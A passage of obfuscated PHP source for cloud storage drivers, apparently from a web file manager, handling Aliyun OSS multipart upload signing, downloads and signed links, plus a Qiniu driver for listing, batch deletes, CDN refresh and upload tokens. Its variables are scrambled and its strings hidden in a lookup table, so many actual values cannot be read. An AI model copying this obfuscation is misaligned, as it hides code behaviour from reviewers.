$this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ñùşì­ä), $á¬éµ¹¬); return array($îÔà¹ˆ¶[223] => $ş¡“¢Ö¥, $îÔà¹ˆ¶[181] => $¨Û¸¥¢Ò . $îÔà¹ˆ¶[8] . $this->pathEncode($Ñùşì­ä), $îÔà¹ˆ¶[224] => gmdate($îÔà¹ˆ¶[1417]), $îÔà¹ˆ¶[94] => $Ñùşì­ä); } public function multiUploadAuthData($óÔËôÔ¬, $ù‰Şí¢ = array()) { $ó™ûÂÏƒ =& $_SERVER[ßğøİ]; $§¾¸Ã¡Ü = isset($ù‰Şí¢[$ó™ûÂÏƒ[224]]) ? $ù‰Şí¢[$ó™ûÂÏƒ[224]] : gmdate($ó™ûÂÏƒ[1417]); $ª´õç„” = isset($ù‰Şí¢[$ó™ûÂÏƒ[174]]) ? $ù‰Şí¢[$ó™ûÂÏƒ[174]] : $ó™ûÂÏƒ[12]; $¾Ã¦˜Ò° = $óÔËôÔ¬; if (isset($ù‰Şí¢[$ó™ûÂÏƒ[94]])) { $¾Ã¦˜Ò° = $ù‰Şí¢[$ó™ûÂÏƒ[94]]; unset($ù‰Şí¢[$ó™ûÂÏƒ[94]]); } if (isset($ù‰Şí¢[$ó™ûÂÏƒ[225]])) { $ù‰Şí¢[$ó™ûÂÏƒ[224]] = $§¾¸Ã¡Ü; return $this->listUploadParts($¾Ã¦˜Ò°, $ù‰Şí¢); } $³€Óà¯œ = array($ó™ûÂÏƒ[226], $ó™ûÂÏƒ[12], $ó™ûÂÏƒ[120], $§¾¸Ã¡Ü, "\170\55\157\163\163\x2d\x64\141\164\145\72{$§¾¸Ã¡Ü}", $ó™ûÂÏƒ[8] . $this->bucket . $ó™ûÂÏƒ[8] . $¾Ã¦˜Ò° . $ª´õç„”); if (strpos($ª´õç„”, $ó™ûÂÏƒ[227]) === 0) { $³€Óà¯œ[0] = $ó™ûÂÏƒ[228]; if ($…şÍîèç = $this->trafficLimit($ó™ûÂÏƒ[1409])) { $¾Ã¦˜Ò° = $ó™ûÂÏƒ[1418]; array_splice($³€Óà¯œ, 5, 0, $¾Ã¦˜Ò° . $ó™ûÂÏƒ[4] . $…şÍîèç[$¾Ã¦˜Ò°]); } } if (isset($ù‰Şí¢[$ó™ûÂÏƒ[229]]) && $ù‰Şí¢[$ó™ûÂÏƒ[229]] == $ó™ûÂÏƒ[230]) { $³€Óà¯œ[0] = $ó™ûÂÏƒ[230]; } if (!empty($ù‰Şí¢[$ó™ûÂÏƒ[1419]])) { $©®ß½Í = array_merge(array($³€Óà¯œ[4]), $ù‰Şí¢[$ó™ûÂÏƒ[1419]]); sort($©®ß½Í); $³€Óà¯œ[4] = implode($ó™ûÂÏƒ[231], $©®ß½Í); } $ÉØÖÅ°ª = implode($ó™ûÂÏƒ[231], $³€Óà¯œ); $Ä¤­—ƒ = base64_encode(hash_hmac($ó™ûÂÏƒ[232], $ÉØÖÅ°ª, $this->secret, !0)); $…ÇÆêÍ = $ó™ûÂÏƒ[1383] . $this->accessKey . $ó™ûÂÏƒ[4] . $Ä¤­—ƒ; if (strpos($ª´õç„”, $ó™ûÂÏƒ[227]) === 0) { $…ÇÆêÍ = array($ó™ûÂÏƒ[234] => $…ÇÆêÍ, $ó™ûÂÏƒ[224] => $§¾¸Ã¡Ü); if ($…şÍîèç) { $…ÇÆêÍ = array_merge($…ÇÆêÍ, $…şÍîèç); } } return $…ÇÆêÍ; } public function listUploadParts($Ò¼°çÚ¹, $Ö“æ¥ÁÌ) { $¿†Ëá†’ =& $_SERVER[ßğøİ]; $”‹šò¬È = parse_url_query($Ö“æ¥ÁÌ[$¿†Ëá†’[174]]); $‡ÎÉ§Şº = $this->client->listParts($this->bucket, $this->pathEncode($Ò¼°çÚ¹), $”‹šò¬È[$¿†Ëá†’[223]]); $¨ÈÆœÕ = $‡ÎÉ§Şº->getListPart(); $Å²ßî®³ = array(); foreach ($¨ÈÆœÕ as $¿æ¿Ì¿­) { $Å²ßî®³[] = array($¿†Ëá†’[1403] => $¿æ¿Ì¿­->getPartNumber(), $¿†Ëá†’[1404] => trim($¿æ¿Ì¿­->getETag(), $¿†Ëá†’[118])); } unset($Ö“æ¥ÁÌ[$¿†Ëá†’[225]], $Ö“æ¥ÁÌ[$¿†Ëá†’[229]]); $ŠÓ¹Õà‹ = $this->multiUploadAuthData($Ò¼°çÚ¹, $Ö“æ¥ÁÌ); if (empty($ŠÓ¹Õà‹)) { return !1; } return array($¿†Ëá†’[234] => $ŠÓ¹Õà‹, $¿†Ëá†’[224] => $Ö“æ¥ÁÌ[$¿†Ëá†’[224]], $¿†Ëá†’[236] => $Å²ßî®³); } public function download($ãúéü×¨, $Ğ¨ŒËŞğ) { if ($this->isFolder($ãúéü×¨)) { return !1; } try { $×ÜîÚ†ï = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ğ¨ŒËŞğ); $×ÜîÚ†ï = $this->trafficLimit($_SERVER[ßğøİ][109], $×ÜîÚ†ï); $this->client->getObject($this->bucket, $this->pathEncode($ãúéü×¨), $×ÜîÚ†ï); } catch (OSS\Core\OssException $“×¡Ğ˜) { return !1; } return $Ğ¨ŒËŞğ; } public function fileSubstr($‚ğ›¦±¿, $Êœ‹è†Ë = 0, $ä×Ò³’ = false) { if ($Êœ‹è†Ë === -1) { $ÅùŞŠ· = array(); } else { if ($ä×Ò³’ === !1) { $ÏÊÎŞ² = $this->size($‚ğ›¦±¿); } else { $ÏÊÎŞ² = $Êœ‹è†Ë + $ä×Ò³’ - 1; } $ÅùŞŠ· = array(OSS\OssClient::OSS_RANGE => "{$Êœ‹è†Ë}\x2d{$ÏÊÎŞ²}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($‚ğ›¦±¿), $ÅùŞŠ·); } catch (OSS\Core\OssException $ú²—ùòÙ) { think_exception($ú²—ùòÙ->getMessage()); return !1; } } private function trafficLimit($æğßÇ£, $ÒÓâëª  = array()) { $üÌ¦…ãü =& $_SERVER[ßğøİ]; if ($æğßÇ£ == $üÌ¦…ãü[1409] && $this->isUploadServer() || $æğßÇ£ == $üÌ¦…ãü[109] && $this->isFileOutServer()) { return $ÒÓâëª ; } $•«ëå = floatval($GLOBALS[$üÌ¦…ãü[6]][$üÌ¦…ãü[89]][$üÌ¦…ãü[107]][$æğßÇ£]) * 1024 * 1024 * 8; if (!$•«ëå) { return $ÒÓâëª ; } $•«ëå = $•«ëå < 819200 ? 819200 : ($•«ëå > 838860800 ? 838860800 : $•«ëå); $ÒÓâëª [OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($•«ëå); return $ÒÓâëª ; } public function link($æûÇ’, $ÄÌ¨óæß = array()) { $‚ë£úî¼ =& $_SERVER[ßğøİ]; if (!$this->exist($æûÇ’) || $this->isFolder($æûÇ’)) { return !1; } try { $ÄÌ¨óæß = $this->trafficLimit($‚ë£úî¼[109], $ÄÌ¨óæß); $¥ê¬İä = $this->client->signUrl($this->bucket, $this->pathEncode($æûÇ’), 3600 * 12, $‚ë£úî¼[230], $ÄÌ¨óæß); return $this->getCdnLink($¥ê¬İä); } catch (OSS\Core\OssException $Ì¼¹šœó) { return !1; } } public function fileOut($¨ŒÀ¼àŸ, $ò¹É¬‚ = false, $¨ó¬Ê¶ = false, $³¦ÓÏ‚Ğ = '') { $—ùÃ¢£ =& $_SERVER[ßğøİ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¨ŒÀ¼àŸ, $ò¹É¬‚, $¨ó¬Ê¶, $³¦ÓÏ‚Ğ); } if (!$¨ó¬Ê¶) { $¨ó¬Ê¶ = $this->pathThis($¨ŒÀ¼àŸ); } $¨ó¬Ê¶ = rawurlencode($¨ó¬Ê¶); $ÇÆ½¯» = get_file_mime(get_path_ext($¨ó¬Ê¶)); if ($ÇÆ½¯» == $—ùÃ¢£[217]) { return parent::fileOut($¨ŒÀ¼àŸ, $ò¹É¬‚, $¨ó¬Ê¶, $³¦ÓÏ‚Ğ); } $ò¹É¬‚ = $ò¹É¬‚ ? $—ùÃ¢£[1420] : $—ùÃ¢£[1421]; $ï­Çò—Ñ = array(OSS\OssClient::OSS_SUB_RESOURCE => $—ùÃ¢£[1422] . rawurlencode("{$ò¹É¬‚}\73\146\151\x6c\145\x6e\x61\x6d\x65\x3d{$¨ó¬Ê¶}")); $ï­Çò—Ñ[OSS\OssClient::OSS_SUB_RESOURCE] .= $—ùÃ¢£[1423] . rawurlencode($ÇÆ½¯»); $¬ÔÑÈ = $this->link($¨ŒÀ¼àŸ, $ï­Çò—Ñ); $this->fileOutLink($¬ÔÑÈ); } public function fileOutServer($ïÑ…ı™ª, $ÂúúëÄ‚ = false, $Ù¸àşÙ = false, $ı´Â–âŒ = '') { parent::fileOut($ïÑ…ı™ª, $ÂúúëÄ‚, $Ù¸àşÙ, $ı´Â–âŒ); } public function fileOutImage($Íªµ‰í•, $·¾Æ‡†½ = 250) { $óà¼Ü¡ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ßğøİ][1424] . $·¾Æ‡†½); $Û—ƒıè = $this->link($Íªµ‰í•, $óà¼Ü¡); $this->fileOutLink($Û—ƒıè); } public function fileOutImageServer($‚Š¢İĞ…, $µ¢½Š‚ = 250) { parent::fileOutImage($‚Š¢İĞ…, $µ¢½Š‚); } public function fileOutLink($Î¬¥ªŒ) { $İÇŞÌÄÓ =& $_SERVER[ßğøİ]; if (!$this->isCdnHost() && substr($Î¬¥ªŒ, 0, 7) == $İÇŞÌÄÓ[1325]) { $Î¬¥ªŒ = $İÇŞÌÄÓ[1326] . substr($Î¬¥ªŒ, 7); } header($İÇŞÌÄÓ[161] . $Î¬¥ªŒ); die; } public function hashMd5($„¬›ïèË, $­ªßµú = '') { $ğÁôœ =& $_SERVER[ßğøİ]; $ã¸Û¦éá = $this->_objectMeta($„¬›ïèË); if (!$ã¸Û¦éá) { return $ğÁôœ[12]; } if (!isset($ã¸Û¦éá[$ğÁôœ[1399]]) && !empty($­ªßµú)) { $ëïÔæ = $this->updateObjMeta($„¬›ïèË, array($ğÁôœ[1399] => $­ªßµú)); $ã¸Û¦éá[$ğÁôœ[1399]] = $ëïÔæ ? $­ªßµú : $ğÁôœ[12]; } return isset($ã¸Û¦éá[$ğÁôœ[1399]]) ? strtolower($ã¸Û¦éá[$ğÁôœ[1399]]) : $ğÁôœ[12]; } public function size($‚¹Ìıº¢) { $øì£ºº = $this->objectMeta($‚¹Ìıº¢); return $øì£ºº ? $øì£ºº[$_SERVER[ßğøİ][76]] : 0; } public function info($²‡¹èô) { if ($this->isFolder($²‡¹èô)) { return $this->folderInfo($²‡¹èô); } else { if ($this->isFile($²‡¹èô)) { return $this->fileInfo($²‡¹èô); } } return !1; } public function exist($ÚÇÑÎıï) { return $this->isFile($ÚÇÑÎıï) || $this->isFolder($ÚÇÑÎıï); } public function isFile($¿•ŒááÄ) { return !$this->isFolder($¿•ŒááÄ) && $this->objectMeta($¿•ŒááÄ); } public function isFolder($¶œÆ••) { return $this->cacheMethod($_SERVER[ßğøİ][165], $¶œÆ••); } protected function objectMeta($«¹•ªÜ¡) { return $this->cacheMethod($_SERVER[ßğøİ][167], $«¹•ªÜ¡); } protected function _objectMeta($©…³‚ÄÚ) { $ÉÃ÷¸“‡ =& $_SERVER[ßğøİ]; try { $ì²Òšø = $this->client->getObjectMeta($this->bucket, $this->pathEncode($©…³‚ÄÚ)); } catch (OSS\Core\OssException $¡èÏàÏ¸) { $ì²Òšø = !1; } if ($ì²Òšø) { $ì²Òšø[$ÉÃ÷¸“‡[76]] = intval($ì²Òšø[$ÉÃ÷¸“‡[1397]]); } return $ì²Òšø; } protected function _isFolder($…ãö ) { $†“ŠîÕµ =& $_SERVER[ßğøİ]; if ($…ãö  == $†“ŠîÕµ[12] || $…ãö  == $†“ŠîÕµ[8]) { return !0; } $ßÒ¦Éóù = array($†“ŠîÕµ[1393] => $†“ŠîÕµ[8], $†“ŠîÕµ[1394] => rtrim($…ãö , $†“ŠîÕµ[8]) . $†“ŠîÕµ[8], $†“ŠîÕµ[1395] => 1, $†“ŠîÕµ[1396] => $†“ŠîÕµ[12]); $ÃÜÈí¹ = $this->client->listObjects($this->bucket, $ßÒ¦Éóù); if ($ÃÜÈí¹->getObjectList() || $ÃÜÈí¹->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($´˜€õñ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ßğøİ][1425]; $this->_init($´˜€õñ); } public function _init($˜¨„°Š¢) { $Ì® ‘³Â =& $_SERVER[ßğøİ]; foreach ($˜¨„°Š¢ as $üúó¡ÀŒ => $†´üÏ‹Ò) { if (isset($this->{$üúó¡ÀŒ})) { $this->{$üúó¡ÀŒ} = $†´üÏ‹Ò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ì® ‘³Â[1426] . LNG($Ì® ‘³Â[1384])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ë–Å‚ã‘, $œ·İ»Ñ¯ = '', $¬“õ…œ‡ = REPEAT_RENAME) { if ($this->setContent($ë–Å‚ã‘, $œ·İ»Ñ¯)) { return $this->getPathOuter($ë–Å‚ã‘); } return !1; } public function mkdir($ø‹‡‘ø, $ŒÃ¿ßïã = REPEAT_SKIP) { $†èÜÔöş =& $_SERVER[ßğøİ]; $¯§»¸¹Ç = trim($ø‹‡‘ø, $†èÜÔöş[8]); if ($this->_isFolder($¯§»¸¹Ç)) { return $this->getPathOuter($¯§»¸¹Ç); } $ø‹‡‘ø = $¯§»¸¹Ç . $†èÜÔöş[8]; $¨¨——İº = get_path_this($¯§»¸¹Ç); $«éÂÎŸ¬ = $ø‹‡‘ø . $¨¨——İº; if (!$this->mkfile($«éÂÎŸ¬)) { return !1; } if (!$this->moveFile($«éÂÎŸ¬, $ø‹‡‘ø)) { $this->delFile($«éÂÎŸ¬); return !1; } return $this->getPathOuter($¯§»¸¹Ç); } public function copyFile($ò½³¦¡ë, $õ†ı·Íš) { $ôªé”¶ = $this->bucketManager->copy($this->bucket, $ò½³¦¡ë, $this->bucket, $õ†ı·Íš, !0); return $ôªé”¶ ? !1 : $this->getPathOuter($õ†ı·Íš); } public function moveFile($ª¤ô¶™ù, $ë¾©Èû€) { $Ú…­¥¸Ô = $this->bucketManager->move($this->bucket, $ª¤ô¶™ù, $this->bucket, $ë¾©Èû€, !0); return $Ú…­¥¸Ô ? !1 : $this->getPathOuter($ë¾©Èû€); } public function delFile($ùÙ‰¡¥Ç) { if (!$this->exist($ùÙ‰¡¥Ç)) { return !0; } $íÖÙ÷øˆ = $this->bucketManager->delete($this->bucket, $ùÙ‰¡¥Ç); return $íÖÙ÷øˆ ? !1 : !0; } public function delFolder($·û‹£²ç) { $Ã‰Ä„±é =& $_SERVER[ßğøİ]; if (!$this->exist($·û‹£²ç)) { return !0; } $this->listItemCache = !1; $è×µÎ¢ş = $this->fileList($·û‹£²ç); $this->listItemCache = !0; $©÷¿›§¬ = trim($·û‹£²ç, $Ã‰Ä„±é[8]) . $Ã‰Ä„±é[8]; if (!empty($·û‹£²ç) && $·û‹£²ç !== $Ã‰Ä„±é[197] && !in_array($©÷¿›§¬, $è×µÎ¢ş[$Ã‰Ä„±é[82]])) { $è×µÎ¢ş[$Ã‰Ä„±é[82]][] = $©÷¿›§¬; } $öİù½§ğ = $this->delByBatch($è×µÎ¢ş[$Ã‰Ä„±é[83]]); if (!$öİù½§ğ) { return !1; } $öİù½§ğ = $this->delByBatch($è×µÎ¢ş[$Ã‰Ä„±é[82]]); if (!$öİù½§ğ) { return !1; } return $this->delFile($©÷¿›§¬); } private function delByBatch($„Ï¶©Â–) { foreach (array_chunk($„Ï¶©Â–, 1000) as $œ«·ãÀò) { $ùÙ¢Ş¾ô = $this->bucketManager->buildBatchDelete($this->bucket, $œ«·ãÀò); list($Ìì´ÃïÛ, $º¨Çêää) = $this->bucketManager->batch($ùÙ¢Ş¾ô); if ($º¨Çêää) { return !1; } } return !0; } public function rename($÷²¼¥Ç“, $‘¦§õíÀ) { return $this->renameObject($÷²¼¥Ç“, $‘¦§õíÀ); } public function fileInfo($Á¬ ‘–, $›Ì¯±¨× = false, $±±æÂ˜“ = array()) { $ûñ¦Ú‡é =& $_SERVER[ßğøİ]; $áÑ†é§Ñ = array($ûñ¦Ú‡é[32] => $this->pathThis($Á¬ ‘–), $ûñ¦Ú‡é[84] => $this->getPathOuter($ûñ¦Ú‡é[8] . $Á¬ ‘–), $ûñ¦Ú‡é[33] => $ûñ¦Ú‡é[199], $ûñ¦Ú‡é[76] => isset($±±æÂ˜“[$ûñ¦Ú‡é[1427]]) ? $±±æÂ˜“[$ûñ¦Ú‡é[1427]] : 0, $ûñ¦Ú‡é[174] => $this->ext($Á¬ ‘–)); if ($›Ì¯±¨×) { return $áÑ†é§Ñ; } $áÑ†é§Ñ[$ûñ¦Ú‡é[200]] = $áÑ†é§Ñ[$ûñ¦Ú‡é[85]] = 0; $áÑ†é§Ñ[$ûñ¦Ú‡é[201]] = $áÑ†é§Ñ[$ûñ¦Ú‡é[202]] = !0; if (empty($±±æÂ˜“)) { $±±æÂ˜“ = $this->objectMeta($Á¬ ‘–); if (!$±±æÂ˜“) { return $áÑ†é§Ñ; } } if (isset($±±æÂ˜“[$ûñ¦Ú‡é[1428]])) { $áÑ†é§Ñ[$ûñ¦Ú‡é[85]] = substr($±±æÂ˜“[$ûñ¦Ú‡é[1428]] . $ûñ¦Ú‡é[12], 0, 10); } if (isset($±±æÂ˜“[$ûñ¦Ú‡é[1427]])) { $áÑ†é§Ñ[$ûñ¦Ú‡é[76]] = $±±æÂ˜“[$ûñ¦Ú‡é[1427]]; } return $áÑ†é§Ñ; } public function folderInfo($ÑóÆÓ˜È, $¶¯ç™Â = false) { $üÂœîã =& $_SERVER[ßğøİ]; $µ°Ã±¨æ = array($üÂœîã[32] => $this->pathThis($ÑóÆÓ˜È), $üÂœîã[84] => $this->getPathOuter($üÂœîã[8] . $ÑóÆÓ˜È), $üÂœîã[33] => $üÂœîã[75]); if ($¶¯ç™Â) { return $µ°Ã±¨æ; } $µ°Ã±¨æ[$üÂœîã[200]] = $µ°Ã±¨æ[$üÂœîã[85]] = 0; $µ°Ã±¨æ[$üÂœîã[201]] = $µ°Ã±¨æ[$üÂœîã[202]] = !0; $ÑóÆÓ˜È = rtrim($ÑóÆÓ˜È, $üÂœîã[8]) . $üÂœîã[8]; $¥òÅŸ‹š = $this->objectMeta($ÑóÆÓ˜È); if (isset($¥òÅŸ‹š[$üÂœîã[1428]])) { $µ°Ã±¨æ[$üÂœîã[85]] = substr($¥òÅŸ‹š[$üÂœîã[1428]] . $üÂœîã[12], 0, 10); } return $µ°Ã±¨æ; } public function listPath($Ò¥Á£Á¶, $ãşëõ¬² = false) { $İ‚¨Ã¬Ø =& $_SERVER[ßğøİ]; $ûà¥ş®¯ = $this->fileList($Ò¥Á£Á¶, $İ‚¨Ã¬Ø[8], !0); foreach ($ûà¥ş®¯[$İ‚¨Ã¬Ø[82]] as $Ÿ“õ¸Şè => $‰ŒŞ‰Ÿ) { $ûà¥ş®¯[$İ‚¨Ã¬Ø[82]][$Ÿ“õ¸Şè] = $this->folderInfo($‰ŒŞ‰Ÿ, $ãşëõ¬²); } foreach ($ûà¥ş®¯[$İ‚¨Ã¬Ø[83]] as $Ÿ“õ¸Şè => $‰ŒŞ‰Ÿ) { $ûà¥ş®¯[$İ‚¨Ã¬Ø[83]][$Ÿ“õ¸Şè] = $this->fileInfo($‰ŒŞ‰Ÿ[$İ‚¨Ã¬Ø[94]], $ãşëõ¬², $‰ŒŞ‰Ÿ); } return $ûà¥ş®¯; } public function has($ğÄ±½»Ö, $Š‚çæÜ¸ = false, $õğÄˆä = true) { $Á¾—ú³ =& $_SERVER[ßğøİ]; $ğÄ±½»Ö = trim($ğÄ±½»Ö, $Á¾—ú³[8]); $Š¼ãÑƒ€ = empty($ğÄ±½»Ö) && $ğÄ±½»Ö !== $Á¾—ú³[197] ? $Á¾—ú³[12] : $ğÄ±½»Ö . $Á¾—ú³[8]; $ˆÃªÄæı = $Á¾—ú³[12]; $×ÌúêÏŒ = 500; $÷šš¡ = $Á¾—ú³[8]; $ñÈèØµ× = $¡íÄİ‚ = 0; while (!0) { check_abort(); list($¤å½Ô• , $ì²ÎÒáã) = $this->bucketManager->listFiles($this->bucket, $Š¼ãÑƒ€, $ˆÃªÄæı, $×ÌúêÏŒ, $÷šš¡); if ($ì²ÎÒáã) { break; } $ˆÃªÄæı = array_key_exists($Á¾—ú³[1396], $¤å½Ô• ) ? $ˆÃªÄæı = $¤å½Ô• [$Á¾—ú³[1429]] : $Á¾—ú³[12]; if ($Š‚çæÜ¸) { if (!empty($¤å½Ô• [$Á¾—ú³[1430]])) { $ñÈèØµ× += count($¤å½Ô• [$Á¾—ú³[1430]]); } if (!empty($¤å½Ô• [$Á¾—ú³[1431]])) { $¡íÄİ‚ += count($¤å½Ô• [$Á¾—ú³[1431]]); } if ($ˆÃªÄæı === $Á¾—ú³[12]) { break; } continue; } if ($õğÄˆä) { if (!empty($¤å½Ô• [$Á¾—ú³[1430]])) { return !0; } } else { if (!empty($¤å½Ô• [$Á¾—ú³[1431]])) { return !0; } } if ($ˆÃªÄæı === $Á¾—ú³[12]) { break; } } if ($Š‚çæÜ¸) { return array($Á¾—ú³[207] => $ñÈèØµ×, $Á¾—ú³[208] => $¡íÄİ‚); } return !1; } public function listAll($ğÖÎ­ø€) { $’æÓ±›¼ =& $_SERVER[ßğøİ]; $ ²æ²µ = $this->fileList($ğÖÎ­ø€, $’æÓ±›¼[12], !0); $£š±£Ó› = array(); foreach ($ ²æ²µ[$’æÓ±›¼[83]] as $¼¸ÓÕ) { $£š±£Ó›[$¼¸ÓÕ[$’æÓ±›¼[94]]] = $¼¸ÓÕ[$’æÓ±›¼[76]]; } foreach ($ ²æ²µ[$’æÓ±›¼[82]] as $¼¸ÓÕ) { if (is_string($¼¸ÓÕ)) { $£š±£Ó›[$¼¸ÓÕ] = 0; } } return $this->listAllFiles($ğÖÎ­ø€, array_keys($£š±£Ó›), $£š±£Ó›); } private function fileList($áæŞâÎı, $À¡çÖğ¢ = '', $Ø˜ïÅ¸¾ = 0) { $÷şËÒ¬ =& $_SERVER[ßğøİ]; $áæŞâÎı = trim($áæŞâÎı, $÷şËÒ¬[8]); $èí¥Ş¾Ò = empty($áæŞâÎı) && $áæŞâÎı !== $÷şËÒ¬[197] ? $÷şËÒ¬[12] : $áæŞâÎı . $÷şËÒ¬[8]; $ê©ú¨ = $÷şËÒ¬[12]; $˜³óöÆÉ = 1000; $ÁËŠ™•£ = $Ş–×È¬ï = array(); while (!0) { check_abort(); list($÷â ­Ù, $ÚùîÛğ·) = $this->bucketManager->listFiles($this->bucket, $èí¥Ş¾Ò, $ê©ú¨, $˜³óöÆÉ, $À¡çÖğ¢); if ($ÚùîÛğ·) { break; } $ê©ú¨ = array_key_exists($÷şËÒ¬[1396], $÷â ­Ù) ? $ê©ú¨ = $÷â ­Ù[$÷şËÒ¬[1429]] : $÷şËÒ¬[12]; $¦²àÒÎË = isset($÷â ­Ù[$÷şËÒ¬[1430]]) ? $÷â ­Ù[$÷şËÒ¬[1430]] : array(); $”³¬©á = isset($÷â ­Ù[$÷şËÒ¬[1431]]) ? $÷â ­Ù[$÷şËÒ¬[1431]] : array(); foreach ($¦²àÒÎË as $Á¿¸¦ÈĞ) { if ($Á¿¸¦ÈĞ[$÷şËÒ¬[94]] == $èí¥Ş¾Ò) { continue; } $©¢…òüÑ = $Á¿¸¦ÈĞ[$÷şËÒ¬[94]]; $ÕÇ©ï½“ = $Á¿¸¦ÈĞ[$÷şËÒ¬[1427]]; $Á¿¸¦ÈĞ[$÷şËÒ¬[76]] = $ÕÇ©ï½“; $á“§ÙÙ¿ = $ÕÇ©ï½“ == 0 && substr($©¢…òüÑ, strlen($©¢…òüÑ) - 1, 1) == $÷şËÒ¬[8] ? !0 : !1; $this->cacheMethodInfoSet($©¢…òüÑ, $á“§ÙÙ¿, $Á¿¸¦ÈĞ); if ($á“§ÙÙ¿) { $ÁËŠ™•£[] = $©¢…òüÑ; continue; } $Ş–×È¬ï[] = $Ø˜ïÅ¸¾ ? $Á¿¸¦ÈĞ : $©¢…òüÑ; } foreach ($”³¬©á as $©¢…òüÑ) { if ($©¢…òüÑ == $èí¥Ş¾Ò) { continue; } $ÁËŠ™•£[] = $©¢…òüÑ; $this->cacheMethodInfoSet($©¢…òüÑ, !0); } if ($ê©ú¨ === $÷şËÒ¬[12]) { break; } } $this->cacheMethodInfoSet($áæŞâÎı, !0); return array($÷şËÒ¬[82] => $ÁËŠ™•£, $÷şËÒ¬[83] => $Ş–×È¬ï); } public function canRead($›Å±á›Ë) { return $this->exist($›Å±á›Ë) ? !0 : !1; } public function canWrite($™®å±ûÙ) { return $this->exist($™®å±ûÙ) ? !0 : !1; } public function getContent($µ—·Äâ) { return $this->fileSubstr($µ—·Äâ, 0, -1); } public function setContent($Ñù—™í, $´Òáµëõ = '') { $ıïƒ¦˜Â = $this->tempFile($this->pathThis($Ñù—™í)); file_put_contents($ıïƒ¦˜Â, $´Òáµëõ); if ($this->upload($Ñù—™í, $ıïƒ¦˜Â)) { $this->tempFileRemve($ıïƒ¦˜Â); return !0; } return !1; } public function refreshUrls($Ä¦à„æ) { $û½Ó”Ü =& $_SERVER[ßğøİ]; $ªÓ¡Ò•ƒ = array(); if (is_array($Ä¦à„æ)) { foreach ($Ä¦à„æ as $ş¶…‹öŸ) { $ªÓ¡Ò•ƒ[] = $this->link($ş¶…‹öŸ); } } else { $ªÓ¡Ò•ƒ[] = $this->link($Ä¦à„æ); } $ô ¦£œ = new Qiniu\Cdn\CdnManager($this->auth); list($Ç¼…ˆï, $›¢Ûš¸) = $ô ¦£œ->refreshUrls($ªÓ¡Ò•ƒ); if ($›¢Ûš¸) { return !1; } return $Ç¼…ˆï[$û½Ó”Ü[1183]] == $û½Ó”Ü[757] ? !0 : !1; } public function fileSubstr($ßÄõüÂô, $ŞıĞš§ß, $Ñ¯¨êÚÈ) { $ÄÉ¾‘è¯ =& $_SERVER[ßğøİ]; if (!($¡²©í¦¯ = $this->link($ßÄõüÂô))) { return !1; } $Ÿ§£ıØ = !1; if ($Ñ¯¨êÚÈ > 0) { $ÜÜåêÍŠ = $ŞıĞš§ß + $Ñ¯¨êÚÈ - 1; $Ÿ§£ıØ = array($ÄÉ¾‘è¯[1432] . $ŞıĞš§ß . $ÄÉ¾‘è¯[386] . $ÜÜåêÍŠ); } $Ñ¯–¾¦¤ = url_request($¡²©í¦¯, $ÄÉ¾‘è¯[230], !1, $Ÿ§£ıØ); return $Ñ¯–¾¦¤[$ÄÉ¾‘è¯[747]] ? $Ñ¯–¾¦¤[$ÄÉ¾‘è¯[1193]] : !1; } public function upload($ÛèøÕÎ, $Š­¡Ó¶¹, $¬ûĞ°™¢ = false, $êªÁ˜Åİ = REPEAT_REPLACE) { $¯Ÿ©ùâ± = new Qiniu\Storage\UploadManager(); $ºó¢¡ÑŸ = $this->auth->uploadToken($this->bucket, $ÛèøÕÎ); $€¸Ë§²Ê = get_file_mime(get_path_ext($Š­¡Ó¶¹)); list($Ÿ÷ê’ñ, $¸ŠøˆÃ) = $¯Ÿ©ùâ±->putFile($ºó¢¡ÑŸ, $ÛèøÕÎ, $Š­¡Ó¶¹, null, $€¸Ë§²Ê); return $¸ŠøˆÃ ? !1 : $this->getPathOuter($ÛèøÕÎ); } public function uploadFormData($øˆÌ“µ°, $ÅÍˆ§Æï = 3600) { return $this->uploadToken($øˆÌ“µ°, $ÅÍˆ§Æï); } public function multiUploadFormData($Î…”Õæ, $«½ûá¬´ = 3600) { return $this->uploadToken($Î…”Õæ, $«½ûá¬´); } private function uploadToken($ºàˆæ», $µ’ñ±õ¯ = 3600) { $’³Œ¶‰­ =& $_SERVER[ßğøİ]; $¨®öµ¨ = $µ’ñ±õ¯; $ñÛÜ¨•„ = array($’³Œ¶‰­[1433] => $’³Œ¶‰­[1434]); $Ò¨Ğ­› = $ºàˆæ»; $ø€ÜÉÁİ = $this->auth->uploadToken($this->bucket, $Ò¨Ğ­›, $¨®öµ¨, $ñÛÜ¨•„, !0); $²âÊ™˜á = empty($this->region) || $this->region == $’³Œ¶‰­[1435] ? $’³Œ¶‰­[12] : $’³Œ¶‰­[386] . $this->region; $¤øŠúÇ = http_type() . "\x3a\x2f\57\x75\160\154\x6f\141\144{$²âÊ™˜á}\x2e\161\x69\x6e\151\x75\160\x2e\x63\157\155\x2f"; return array($’³Œ¶‰­[1436] => $ø€ÜÉÁİ, $’³Œ¶‰­[1437] => $¤øŠúÇ); } public function download($¼Ç¢ÎË, $®İ£†Ù) { $Åõ¶Õ = IO::getPathInner(IO::mkfile($®İ£†Ù)); if (!($ÆÖßŸ = $this->link($¼Ç¢ÎË))) { return !1; } $’İë–› = 0; $¤ëıĞÌÚ = 1024 * 200; $§Îû–¥º = fopen($Åõ¶Õ, $_SERVER[ßğøİ][1438]); while (!0) { $Àã£ñ š = $this->fileSubstr($¼Ç¢ÎË, $’İë–›, $¤ëıĞÌÚ); if ($Àã£ñ š === !1) { return !1; } 